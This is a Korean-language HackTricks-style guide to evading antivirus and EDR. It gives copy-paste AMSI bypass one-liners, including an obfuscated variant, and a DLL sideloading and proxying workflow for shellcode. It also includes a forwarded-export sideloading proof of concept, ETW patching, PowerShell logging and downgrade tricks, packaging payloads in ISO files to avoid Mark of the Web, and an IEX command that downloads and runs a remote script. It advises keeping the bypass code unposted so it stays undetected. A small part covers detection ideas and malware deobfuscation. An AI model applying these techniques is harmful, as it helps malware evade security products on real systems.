# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender가 작동하지 않게 만드는 도구.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV를 가장하여 Windows Defender가 작동하지 않게 만드는 도구.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

현재 AV들은 파일이 악성인지 아닌지를 판단하기 위해 여러 방법을 사용합니다: static detection, dynamic analysis, 그리고 더 고급 EDR들의 경우 behavioural analysis도 사용합니다.

### **Static detection**

Static detection은 바이너리나 스크립트 내부의 알려진 악성 문자열이나 바이트 배열을 플래그하거나, 파일 자체에서 정보(예: file description, company name, digital signatures, icon, checksum 등)를 추출해서 이루어집니다. 이는 공개된 도구를 사용하면 더 쉽게 탐지될 수 있다는 뜻입니다. 공개 도구들은 이미 분석되어 악성으로 플래그되었을 가능성이 큽니다. 이런 탐지를 피하는 몇 가지 방법이 있습니다:

- **Encryption**

바이너리를 암호화하면 AV가 프로그램을 탐지할 방법이 없어지지만, 메모리에서 프로그램을 복호화하고 실행할 수 있는 로더가 필요합니다.

- **Obfuscation**

때때로 바이너리나 스크립트의 몇몇 문자열만 바꿔도 AV를 통과시킬 수 있습니다. 다만 무엇을 난독화하느냐에 따라 시간이 많이 들 수 있습니다.

- **Custom tooling**

자체 도구를 개발하면 알려진 악성 시그니처가 없겠지만, 많은 시간과 노력이 필요합니다.

> [!TIP]
> Windows Defender의 static detection을 확인하는 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 분할한 다음 Defender에게 각 세그먼트를 개별적으로 스캔하게 하여, 바이너리에서 정확히 어떤 문자열이나 바이트가 플래그되는지 알려줍니다.

실무적인 AV Evasion에 관한 이 [YouTube 재생목록](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)을 강력히 추천합니다.

### **Dynamic analysis**

Dynamic analysis는 AV가 바이너리를 sandbox에서 실행하고 악성 활동(예: 브라우저 비밀번호를 복호화하여 읽으려 시도하거나, LSASS에 대해 minidump를 수행하는 등)을 감시하는 방식입니다. 이 부분은 다루기 좀 까다로울 수 있지만, sandbox를 회피하기 위해 할 수 있는 몇 가지 방법이 있습니다.

- **Sleep before execution** 구현 방식에 따라 AV의 dynamic analysis를 우회하는 훌륭한 방법이 될 수 있습니다. AV들은 사용자의 작업 흐름을 방해하지 않기 위해 파일을 스캔할 시간이 매우 짧기 때문에 긴 sleep을 사용하면 분석을 방해할 수 있습니다. 문제는 많은 AV의 sandboxes가 구현 방식에 따라 sleep을 건너뛸 수 있다는 점입니다.
- **Checking machine's resources** 일반적으로 sandbox는 사용할 수 있는 자원이 매우 적습니다(예: < 2GB RAM). 그렇지 않으면 사용자의 머신을 느리게 만들 수 있기 때문입니다. 여기서 창의적으로 접근할 수도 있습니다. 예를 들어 CPU 온도나 팬 속도를 확인하는 것처럼, 모든 항목이 sandbox에 구현되어 있지는 않습니다.
- **Machine-specific checks** 타깃 사용자의 워크스테이션이 "contoso.local" 도메인에 가입되어 있다면, 컴퓨터의 도메인을 확인하여 일치하지 않으면 프로그램을 종료하게 할 수 있습니다.

실제로 Microsoft Defender의 Sandbox computername은 HAL9TH이므로, detonation 전에 malware에서 computer name을 확인하면, 이름이 HAL9TH일 경우 Defender의 sandbox 안에 있다는 뜻이므로 프로그램을 종료하게 만들면 됩니다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>출처: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes에 맞서 싸우기 위한 [@mgeeky](https://twitter.com/mariuszbit)의 다른 좋은 팁들

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 채널</p></figcaption></figure>

이 글에서 이전에 말했듯이, **public tools**는 결국 **탐지됩니다**, 그래서 스스로에게 물어봐야 합니다:

예를 들어, LSASS를 덤프하려는 경우, **mimikatz를 반드시 사용해야 하는가**? 아니면 덜 알려진 다른 프로젝트를 사용해 LSASS를 덤프할 수 있는가?

정답은 후자일 가능성이 큽니다. 예를 들면 mimikatz는 아마도 AV와 EDR에 의해 가장 많이 플래그되는 도구 중 하나일 것입니다. 프로젝트 자체는 훌륭하지만, AV를 우회하려고 작업할 때는 악몽과도 같아서, 달성하려는 목적에 맞는 대안을 찾는 것이 좋습니다.

> [!TIP]
> evasion을 위해 payload를 수정할 때, Defender의 자동 샘플 제출을 반드시 끄고, 장기적인 evasion이 목표라면 **절대 VirusTotal에 업로드하지 마세요**. 특정 AV에서 payload가 탐지되는지 확인하고 싶다면 VM에 해당 AV를 설치하고 자동 샘플 제출을 끈 뒤, 그곳에서 테스트하여 만족스러운 결과가 나올 때까지 실험하세요.

## EXEs vs DLLs

가능할 때마다 **evasion을 위해 DLL을 사용하는 것을 우선시하세요**. 제 경험상 DLL 파일은 보통 **훨씬 덜 탐지**되고 분석되는 경향이 있어, payload가 DLL로 실행될 수 있다면 일부 경우에 매우 단순한 회피 기법이 될 수 있습니다.

아래 이미지에서 볼 수 있듯이, Havoc의 DLL Payload는 antiscan.me에서 탐지율이 4/26인 반면, EXE Payload는 7/26의 탐지율을 보입니다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me에서 일반 Havoc EXE payload vs 일반 Havoc DLL 비교</p></figcaption></figure>

이제 DLL 파일을 사용하여 더 은밀하게 만들기 위해 사용할 수 있는 몇 가지 트릭을 보여드리겠습니다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 loader가 사용하는 DLL 검색 순서를 이용하여, 피해자 애플리케이션과 악성 payload를 서로 인접한 위치에 배치하는 방법입니다.

[Siofra](https://github.com/Cybereason/siofra)와 다음 powershell 스크립트를 사용하여 DLL Sideloading에 취약한 프로그램을 확인할 수 있습니다:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 "C:\Program Files\\" 내에서 DLL hijacking에 취약한 프로그램 목록과 해당 프로그램이 로드하려고 시도하는 DLL 파일들을 출력합니다.

저는 **직접 DLL Hijackable/Sideloadable 프로그램을 탐색해 보시길 강력히 권장합니다**, 이 기법은 제대로 수행하면 상당히 은밀하지만, 공개적으로 알려진 DLL Sideloadable 프로그램을 사용하면 쉽게 적발될 수 있습니다.

프로그램이 로드하기를 기대하는 이름의 malicious DLL을 단순히 배치하는 것만으로는 payload를 로드하지 못합니다. 프로그램이 해당 DLL 내부의 특정 함수를 기대하기 때문입니다. 이 문제를 해결하기 위해 우리는 **DLL Proxying/Forwarding**이라는 다른 기법을 사용할 것입니다.

**DLL Proxying**은 프로그램이 프록시(및 malicious) DLL에서 원래 DLL로 하는 호출을 전달함으로써 프로그램의 기능을 유지하고 payload 실행을 처리할 수 있게 합니다.

저는 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 [@flangvik](https://twitter.com/Flangvik/)로부터 사용할 것입니다.

These are the steps I followed:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 우리에게 2개의 파일을 생성합니다: DLL 소스 코드 템플릿과 원래 이름이 변경된 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 저는 **강력히 권합니다** [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)를 DLL Sideloading 관련해서 시청해 보시고, 또한 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)를 통해 우리가 논의한 내용을 더 깊이 배우시길 권합니다.

### Forwarded Exports 악용 (ForwardSideLoading)

Windows PE 모듈은 실제로 "forwarders"인 함수를 export할 수 있습니다: 코드로 가리키는 대신, export 엔트리는 `TargetDll.TargetFunc` 형태의 ASCII 문자열을 포함합니다. 호출자가 해당 export를 해석할 때, Windows 로더는:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

이해해야 할 주요 동작:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

이것은 간접적인 sideloading primitive를 가능하게 합니다: 함수가 non-KnownDLL 모듈 이름으로 포워딩된 signed DLL을 찾아, 그 signed DLL과 포워딩된 대상 모듈 이름과 정확히 일치하는 이름의 attacker-controlled DLL을 같은 디렉터리에 둡니다. 포워딩된 export가 호출되면, 로더는 포워드를 해석하고 동일한 디렉터리에서 당신의 DLL을 로드하여 DllMain을 실행합니다.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로 일반 검색 순서로 해결됩니다.

PoC (복사-붙여넣기):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더로 복사하세요
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 같은 폴더에 악성 `NCRYPTPROV.dll`을 배치합니다. 코드 실행을 얻기 위해서는 최소한의 `DllMain`만으로도 충분하며, `DllMain`을 트리거하기 위해 forwarded function을 구현할 필요는 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 forward를 트리거:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (서명됨)이 side-by-side `keyiso.dll` (서명됨)을 로드합니다
- `KeyIsoSetAuditingInterface`를 해결하는 동안, 로더는 `NCRYPTPROV.SetAuditingInterface`로의 forward를 따라갑니다
- 로더는 그 다음 `C:\test`에서 `NCRYPTPROV.dll`을 로드하고 `DllMain`을 실행합니다
- `SetAuditingInterface`가 구현되어 있지 않으면, `DllMain`이 이미 실행된 후에야 "missing API" 오류가 발생합니다

Hunting tips:
- 타깃 모듈이 KnownDLL이 아닌 forwarded exports에 집중하세요. KnownDLLs는 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 아래에 나열되어 있습니다.
- 다음과 같은 도구로 forwarded exports를 열거할 수 있습니다:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 후보를 검색하려면 Windows 11 forwarder 인벤토리를 확인하세요: https://hexacorn.com/d/apis_fwd.txt

탐지/방어 아이디어:
- LOLBins(예: rundll32.exe)가 비시스템 경로에서 signed DLLs를 로드한 뒤, 동일한 base name을 가진 non-KnownDLLs를 같은 디렉터리에서 로드하는 동작을 모니터링하세요
- 사용자 쓰기 가능 경로에서 `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` 같은 프로세스/모듈 체인에 대해 경고를 발생시키세요
- 코드 무결성 정책(WDAC/AppLocker)을 적용하고 애플리케이션 디렉터리에서 write+execute 권한을 차단하세요

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze는 suspended processes, direct syscalls, and alternative execution methods를 사용해 EDRs를 우회하는 payload toolkit입니다`

Freeze를 사용해 shellcode를 은밀하게 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is just a cat & mouse game, what works today could be detected tomorrow, so never rely on only one tool, if possible, try chaining multiple evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 막기 위해 만들어졌습니다. 초기에는 AV가 **디스크상의 파일만** 스캔할 수 있었기 때문에, 페이로드를 **메모리에서 직접 실행**할 수 있다면 AV는 이를 막을 수 있는 가시성이 부족했습니다.

AMSI 기능은 Windows의 다음 구성요소에 통합되어 있습니다.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

이는 스크립트 내용을 암호화되거나 난독화되지 않은 형태로 노출시켜 antivirus 솔루션이 스크립트 동작을 검사할 수 있게 합니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음과 같은 경고가 발생합니다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`와 스크립트가 실행된 실행파일의 경로(이 경우 powershell.exe)를 앞에 붙이는 것을 확인할 수 있습니다.

우리는 어떤 파일도 디스크에 드롭하지 않았지만, AMSI 때문에 메모리 상에서 탐지되었습니다.

또한 **.NET 4.8**부터는 C# 코드도 AMSI를 통해 실행됩니다. 이는 `Assembly.Load(byte[])`로 메모리에서 로드하는 경우에도 영향을 미칩니다. 따라서 AMSI를 우회하려면 메모리 실행을 위해 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

AMSI를 회피하는 방법에는 몇 가지가 있습니다:

- **Obfuscation**

AMSI가 주로 정적 탐지에 의존하기 때문에, 로드하려는 스크립트를 수정하는 것은 탐지를 회피하는 좋은 방법이 될 수 있습니다.

그러나 AMSI는 여러 레이어로 난독화된 스크립트도 복원할 수 있는 능력이 있어, 난독화가 어떻게 되었는지에 따라 오히려 좋지 않은 선택일 수 있습니다. 따라서 회피가 항상 간단하지는 않습니다. 하지만 때로는 변수 이름 몇 개만 바꿔도 충분한 경우도 있으므로, 얼마나 많이 플래그되었는지에 따라 달라집니다.

- **AMSI Bypass**

AMSI가 powershell(또는 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하는 방식으로 구현되어 있기 때문에, 권한이 낮은 사용자로 실행 중이더라도 쉽게 조작할 수 있습니다. AMSI 구현의 이 결함 때문에 연구자들은 AMSI 스캔을 회피하는 여러 방법을 찾아냈습니다.

**Forcing an Error**

AMSI 초기화를 실패하게 하면(amsiInitFailed) 현재 프로세스에 대해 스캔이 시작되지 않습니다. 원래 이는 [Matt Graeber](https://twitter.com/mattifestation)이 공개했으며, Microsoft는 광범위한 사용을 막기 위해 시그니처를 개발했습니다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
현재 powershell 프로세스에서 AMSI를 사용할 수 없게 만드는 데 필요한 것은 powershell 코드 한 줄뿐이었다. 물론 이 한 줄은 AMSI에 의해 감지되므로, 이 기법을 사용하려면 일부 수정이 필요하다.

다음은 제가 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
이 게시물이 공개되면 아마 감지될 가능성이 있으므로, 탐지되지 않는 상태를 유지하려면 코드를 게시하지 마세요.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 참고하세요.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**AV/EDR products that uses AMSI**

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**에서 확인할 수 있습니다.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있게 해주는 기능입니다. 이는 감사(auditing)와 문제해결(troubleshooting)에 유용하지만, 탐지를 회피하려는 **attackers에게는 문제**가 될 수 있습니다.

PowerShell logging을 우회(bypass)하려면 다음 기법을 사용할 수 있습니다:

- **Disable PowerShell Transcription and Module Logging**: 이 목적을 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있습니다.
- **Use Powershell version 2**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 AMSI로 스캔되지 않고 스크립트를 실행할 수 있습니다. 이렇게 실행하면 됩니다: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)를 사용해 방어가 비활성화된 powershell을 생성하세요 (이것이 Cobal Strike의 `powerpick`이 사용하는 방식입니다).


## Obfuscation

> [!TIP]
> 여러 obfuscation 기법은 데이터를 암호화하는 것에 의존하는데, 이는 바이너리의 엔트로피를 증가시켜 AVs와 EDRs가 이를 탐지하기 쉽게 만듭니다. 이 점을 주의하고, 민감하거나 숨겨야 하는 코드 섹션에만 암호화를 적용하는 것을 고려하세요.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2(또는 상업적 포크)를 사용하는 malware를 분석할 때, 디컴파일러와 sandbox를 차단하는 여러 보호 계층에 직면하는 것이 일반적입니다. 아래 워크플로우는 신뢰할 수 있게 거의 원본에 가까운 IL을 **복원**하며, 이후 dnSpy나 ILSpy 같은 도구에서 C#으로 디컴파일할 수 있게 합니다.

1.  Anti-tampering removal – ConfuserEx는 모든 *method body*를 암호화하고 *module* static constructor(`<Module>.cctor`) 내부에서 복호화합니다. 또한 PE checksum을 패치하므로 수정 시 바이너리가 크래시할 수 있습니다. 암호화된 메타데이터 테이블을 찾고 XOR 키를 복구하여 깨끗한 어셈블리를 재작성하려면 **AntiTamperKiller**를 사용하세요:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
출력에는 6개의 anti-tamper 파라미터(`key0-key3`, `nameHash`, `internKey`)가 포함되어 있으며, 자체 언패커를 만들 때 유용합니다.

2.  Symbol / control-flow recovery – *clean* 파일을 **de4dot-cex**(ConfuserEx를 인식하는 de4dot의 포크)에 넣으세요.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 프로파일 선택  
• de4dot는 control-flow flattening을 되돌리고 원래의 namespace, class 및 변수 이름을 복원하며 상수 문자열을 복호화합니다.

3.  Proxy-call stripping – ConfuserEx는 디컴파일을 더 어렵게 만들기 위해 직접 메서드 호출을 가벼운 래퍼(일명 *proxy calls*)로 바꿉니다. 이를 제거하려면 **ProxyCall-Remover**를 사용하세요:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 이후에는 불투명한 래퍼 함수(`Class8.smethod_10`, …) 대신 `Convert.FromBase64String`이나 `AES.Create()` 같은 일반적인 .NET API가 보여야 합니다.

4.  Manual clean-up – 결과 바이너리를 dnSpy로 열어 대용량 Base64 블롭이나 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색해 *실제* 페이로드를 찾으세요. 종종 페이로드는 `<Module>.byte_0` 내부에 초기화된 TLV-encoded 바이트 배열로 저장됩니다.

위 체인은 악성 샘플을 실제로 실행하지 않고도 실행 흐름을 복원하므로 오프라인 워크스테이션에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 커스텀 어트리뷰트를 생성하며, 이는 샘플을 자동으로 분류(triage)할 때 IOC로 사용할 수 있습니다.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목적은 [LLVM](http://www.llvm.org/) 컴파일러 스위트의 오픈 소스 포크를 제공하여 code obfuscation 및 tamper-proofing을 통해 소프트웨어 보안을 향상시키는 것입니다.  
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 `C++11/14` 언어를 사용하여 컴파일 시점에 외부 도구나 컴파일러 수정을 하지 않고 obfuscated code를 생성하는 방법을 보여줍니다.  
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming 프레임워크로 생성된 obfuscated operations 레이어를 추가하여 애플리케이션을 크랙하려는 사람의 작업을 조금 더 어렵게 만듭니다.  
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 x64 binary obfuscator로 .exe, .dll, .sys 등을 포함한 다양한 pe files를 obfuscate할 수 있습니다.  
- [**metame**](https://github.com/a0rtega/metame): Metame는 임의의 executables용 간단한 metamorphic code engine입니다.  
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP (return-oriented programming)을 사용하여 LLVM 지원 언어에 대해 세밀한 수준의 code obfuscation 프레임워크입니다. ROPfuscator는 일반 명령어를 ROP chains로 변환하여 어셈블리 코드 수준에서 프로그램을 obfuscate함으로써 일반적인 control flow 개념을 방해합니다.  
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter입니다.  
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 로드할 수 있습니다.

## SmartScreen & MoTW

인터넷에서 일부 executables를 다운로드하고 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 최종 사용자가 잠재적으로 악성인 애플리케이션을 실행하는 것을 방지하기 위한 보안 메커니즘입니다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 reputation-based 접근 방식을 사용합니다. 즉, 드물게 다운로드되는 애플리케이션은 SmartScreen을 트리거하여 경고하고 최종 사용자가 파일을 실행하지 못하게 합니다(하지만 파일은 여전히 More Info -> Run anyway를 클릭하면 실행할 수 있습니다).

**MoTW** (Mark of The Web)은 Zone.Identifier라는 이름의 NTFS Alternate Data Stream으로, 인터넷에서 파일을 다운로드할 때 자동으로 생성되며 다운로드된 URL을 함께 저장합니다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS 확인.</p></figcaption></figure>

> [!TIP]
> trusted signing certificate로 서명된 executables는 SmartScreen을 트리거하지 않는다는 점을 유의하세요.

payloads가 Mark of The Web을 받지 않도록 하는 매우 효과적인 방법은 ISO 같은 컨테이너 안에 패키징하는 것입니다. 이는 Mark-of-the-Web (MOTW)이 non NTFS 볼륨에는 적용될 수 없기 때문입니다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 payloads를 output containers로 패키징하여 Mark-of-the-Web을 회피하는 도구입니다.

예시:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)은 애플리케이션과 시스템 구성요소가 **이벤트를 기록(log events)** 할 수 있게 해주는 Windows의 강력한 로깅 메커니즘입니다. 그러나 보안 제품이 악성 활동을 모니터링하고 탐지하는 데에도 사용될 수 있습니다.

AMSI가 비활성화(우회)되는 방식과 유사하게, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수를 이벤트를 기록하지 않고 즉시 반환하도록 만들 수도 있습니다. 이는 해당 함수를 메모리에서 패치하여 즉시 반환하게 함으로써 그 프로세스의 ETW 로깅을 사실상 비활성화하는 방식입니다.

자세한 내용은 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 를 참고하세요.


## C# Assembly Reflection

C# 바이너리를 메모리에서 로딩하는 방법은 오래전부터 알려져 왔으며, AV에 적발되지 않고 포스트-익스플로잇 도구를 실행하는 데 여전히 매우 좋은 방법입니다.

페이로드가 디스크를 거치지 않고 직접 메모리에 로드되기 때문에, 프로세스 전체에 대해 AMSI를 패치하는 것만 신경 쓰면 됩니다.

대부분의 C2 프레임워크 (sliver, Covenant, metasploit, CobaltStrike, Havoc 등)는 이미 C# 어셈블리를 메모리에서 직접 실행하는 기능을 제공하지만, 이를 수행하는 방법은 여러 가지가 있습니다:

- **Fork\&Run**

이는 **새로운 희생 프로세스(spawning a new sacrificial process)** 를 생성하고, 그 새 프로세스에 포스트-익스플로잇 악성 코드를 인젝션한 뒤 실행하고 완료되면 새 프로세스를 종료하는 방식입니다. 장단점이 있습니다. Fork and run 방식의 장점은 실행이 우리의 Beacon implant 프로세스 **외부(outside)** 에서 발생한다는 점입니다. 즉, 포스트-익스플로잇 동작 중 문제가 생기거나 탐지되더라도 우리의 implant가 살아남을 가능성이 **훨씬 더 큽니다.** 단점은 **Behavioural Detections** 에 의해 탐지될 가능성이 **더 높다**는 점입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

이는 포스트-익스플로잇 악성 코드를 **자체 프로세스에 인젝션(into its own process)** 하는 방식입니다. 이렇게 하면 새 프로세스를 만들고 AV에 스캔되는 것을 피할 수 있지만, 페이로드 실행 중 문제가 생기면 크래시로 인해 **beacon을 잃을** 가능성이 **훨씬 더 큽니다.**

